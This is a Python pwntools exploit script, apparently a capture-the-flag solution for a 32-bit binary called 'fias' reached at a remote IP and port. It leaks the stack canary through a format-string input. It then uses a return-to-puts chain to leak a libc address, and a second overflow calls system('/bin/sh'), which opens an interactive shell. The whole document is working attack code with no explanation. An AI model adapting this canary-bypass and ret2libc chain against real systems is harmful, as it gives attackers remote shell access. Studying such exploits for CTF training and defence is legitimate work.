
from pwn import *

# p = process('./fias')
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('./libc6_2.27-3ubuntu1_i386.so')  # https://libc.blukat.me/
p = remote('88.198.219.20', 43113)

elf = ELF('./fias')

puts_off = libc.sym['puts']

say_hi = 0x08049239

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

pop_ebx = 0x0804901e  # : pop ebx; ret;

p.recvuntil('name? ')
p.sendline('%11$p')
w = p.recvuntil('canary?\n').split()

Canary = int(w[4][:-1], 16)

x = b''
x += p32(puts_plt)
x += p32(pop_ebx)
x += p32(puts_got)
x += p32(say_hi)

p.sendline((p32(Canary) + b'\x00')*6 + b'A' * 11 + x)

leak = p.recvuntil('name? ').split()
leak = u32(leak[0][:4])

LIBC_BASE = leak - puts_off
ADDR_BINSH = next(libc.search(b'/bin/sh')) + LIBC_BASE
ADDR_SYSTEM = libc.symbols['system'] + LIBC_BASE

print()
log.info('Canary :           ' + hex(Canary))
log.info('puts address:      ' + hex(leak))
log.info('Libc base address: ' + hex(LIBC_BASE))
log.info('System address:    ' + hex(ADDR_SYSTEM))
log.info('`/bin/sh` address: ' + hex(ADDR_BINSH))
print()

p.sendline(('A'))

w = b''
w += p32(ADDR_SYSTEM)
w += p32(0xAAAAAAAA)
w += p32(ADDR_BINSH)

p.recvuntil(('canary?\n'))

p.sendline((p32(Canary) + b'\x00')*6 + b'A' * 11 + w)

p.interactive()
